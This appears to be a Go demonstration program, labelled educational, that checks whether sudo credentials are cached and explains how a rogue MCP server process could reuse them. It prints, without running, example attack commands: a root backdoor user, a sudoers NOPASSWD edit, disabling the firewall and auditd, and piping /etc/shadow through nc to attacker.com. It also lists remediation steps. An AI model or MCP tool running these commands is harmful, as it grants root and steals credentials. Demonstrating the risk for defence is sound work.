package main

import (
	"fmt"
	"os/exec"
	"strings"
	"time"

	"github.com/fatih/color"
)

// Colors for output
var (
	red     = color.New(color.FgRed, color.Bold)
	yellow  = color.New(color.FgYellow, color.Bold)
	green   = color.New(color.FgGreen, color.Bold)
	blue    = color.New(color.FgCyan, color.Bold)
	white   = color.New(color.FgWhite)
)

func main() {
	printBanner()
	
	// Educational warning
	red.Println("\n⚠️  EDUCATIONAL DEMONSTRATION ONLY")
	white.Println("This demo shows how MCP processes could exploit sudo caching.")
	white.Println("We will NOT perform any actual exploitation.\n")
	
	// Step 1: Check current environment
	blue.Println("=== Step 1: Checking Environment ===")
	checkEnvironment()
	
	// Step 2: Demonstrate the vulnerability window
	blue.Println("\n=== Step 2: Understanding the Attack Window ===")
	demonstrateVulnerabilityWindow()
	
	// Step 3: Show what an attacker could do (but don't do it)
	blue.Println("\n=== Step 3: Potential Attack Vectors ===")
	showPotentialAttacks()
	
	// Step 4: Provide remediation
	blue.Println("\n=== Step 4: Remediation Steps ===")
	showRemediation()
	
	// Final summary
	printSummary()
}

func printBanner() {
	fmt.Println()
	red.Println("╔══════════════════════════════════════════╗")
	red.Println("║    SUDO TAILGATING VULNERABILITY DEMO    ║")
	red.Println("║          WHITE HAT EDITION               ║")
	red.Println("╚══════════════════════════════════════════╝")
}

func checkEnvironment() {
	// Check if sudo is cached
	fmt.Print("Checking sudo cache status... ")
	cmd := exec.Command("sudo", "-n", "true")
	err := cmd.Run()
	
	if err == nil {
		red.Println("CACHED! ⚠️")
		red.Println("  → Any process can now use sudo without password!")
	} else {
		green.Println("Not cached ✓")
		fmt.Println("  → Sudo will require password")
	}
	
	// Count MCP processes
	fmt.Print("\nCounting MCP processes... ")
	mcpCount := countMCPProcesses()
	if mcpCount > 0 {
		yellow.Printf("Found %d MCP process(es)\n", mcpCount)
		listMCPProcesses()
	} else {
		green.Println("No MCP processes found")
	}
	
	// Check sudo timeout setting
	fmt.Print("\nChecking sudo timeout configuration... ")
	timeout := getSudoTimeout()
	if timeout > 0 {
		yellow.Printf("%d minutes\n", timeout)
		fmt.Println("  → Credentials remain cached for this duration")
	} else {
		green.Println("0 (disabled)")
		fmt.Println("  → Sudo never caches credentials")
	}
}

func demonstrateVulnerabilityWindow() {
	white.Println(`
The Attack Timeline:
`)
	
	fmt.Println("1. User runs: sudo apt update")
	fmt.Println("   └─> User enters password")
	fmt.Println()
	fmt.Println("2. Sudo caches credentials (default: 15 minutes)")
	fmt.Println("   └─> ANY process of that user can now sudo")
	fmt.Println()
	fmt.Println("3. Rogue MCP detects cached credentials")
	fmt.Println("   └─> Monitors: sudo -n true (exit code 0 = cached)")
	fmt.Println()
	fmt.Println("4. Rogue MCP exploits the cache")
	fmt.Println("   └─> sudo -n <malicious command>")
	
	// Simulate monitoring
	yellow.Println("\n[DEMO] Simulating MCP monitoring for sudo cache...")
	for i := 0; i < 3; i++ {
		time.Sleep(500 * time.Millisecond)
		fmt.Printf("  Checking... ")
		
		cmd := exec.Command("sudo", "-n", "true")
		if err := cmd.Run(); err == nil {
			red.Println("SUDO CACHED - VULNERABLE!")
			break
		} else {
			green.Println("Not cached")
		}
	}
}

func showPotentialAttacks() {
	red.Println("\n⚠️  What a rogue MCP COULD do (we won't):")
	
	attacks := []struct {
		desc    string
		command string
		impact  string
	}{
		{
			desc:    "Add backdoor account",
			command: `sudo -n useradd -ou 0 -g 0 backdoor`,
			impact:  "Creates root-level backdoor user",
		},
		{
			desc:    "Modify sudoers",
			command: `sudo -n bash -c 'echo "mcp ALL=NOPASSWD:ALL" >> /etc/sudoers'`,
			impact:  "Permanent passwordless sudo for attacker",
		},
		{
			desc:    "Install persistence",
			command: `sudo -n apt install malicious-package`,
			impact:  "System-wide malware installation",
		},
		{
			desc:    "Disable security",
			command: `sudo -n systemctl stop firewall auditd`,
			impact:  "Disables defensive mechanisms",
		},
		{
			desc:    "Exfiltrate data",
			command: `sudo -n tar -czf - /etc/shadow | nc attacker.com 1337`,
			impact:  "Steals system credentials",
		},
	}
	
	for i, attack := range attacks {
		fmt.Printf("\n%d. %s\n", i+1, attack.desc)
		white.Printf("   Command: %s\n", attack.command)
		yellow.Printf("   Impact: %s\n", attack.impact)
	}
	
	fmt.Println()
	green.Println("✓ This demo will NOT execute these commands")
	green.Println("✓ We only show them for educational purposes")
}

func showRemediation() {
	green.Println("\nProtective Measures:")
	
	fmt.Println("\n1. Disable sudo caching immediately:")
	white.Println("   sudo -k")
	
	fmt.Println("\n2. Disable sudo caching permanently:")
	white.Println("   echo 'Defaults timestamp_timeout=0' | sudo tee -a /etc/sudoers")
	
	fmt.Println("\n3. Run MCPs in isolated contexts:")
	white.Println("   sudo -u mcp-user /path/to/mcp-server")
	
	fmt.Println("\n4. Monitor sudo usage from MCPs:")
	white.Println("   auditctl -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/sudo")
	
	fmt.Println("\n5. Use MCP sandboxing:")
	white.Println("   - Firejail")
	white.Println("   - Docker containers")
	white.Println("   - systemd isolation")
}

func printSummary() {
	fmt.Println()
	blue.Println("═══════════════════════════════════════════")
	blue.Println("                 SUMMARY")
	blue.Println("═══════════════════════════════════════════")
	
	fmt.Println()
	white.Println("The MCP + Sudo combination creates a critical security gap:")
	fmt.Println("• MCPs run with user privileges")
	fmt.Println("• Sudo caches authentication by default")
	fmt.Println("• Result: Any MCP can escalate to root")
	
	fmt.Println()
	red.Println("Remember: With great MCP comes great responsibility!")
	
	fmt.Println()
	green.Println("Stay safe, stay WHITE HAT! 🎩")
}

// Helper functions

func countMCPProcesses() int {
	cmd := exec.Command("pgrep", "-c", "mcp")
	output, _ := cmd.Output()
	
	var count int
	fmt.Sscanf(strings.TrimSpace(string(output)), "%d", &count)
	return count
}

func listMCPProcesses() {
	cmd := exec.Command("sh", "-c", "ps aux | grep -i mcp | grep -v grep")
	output, _ := cmd.Output()
	
	if len(output) > 0 {
		fmt.Println("\n  MCP Processes:")
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if line != "" {
				fmt.Printf("    %s\n", line)
			}
		}
	}
}

func getSudoTimeout() int {
	cmd := exec.Command("sudo", "-l")
	output, _ := cmd.Output()
	
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "timestamp_timeout=") {
			var timeout int
			fmt.Sscanf(line, "%*[^=]=%d", &timeout)
			return timeout
		}
	}
	
	return 15 // Default sudo timeout
}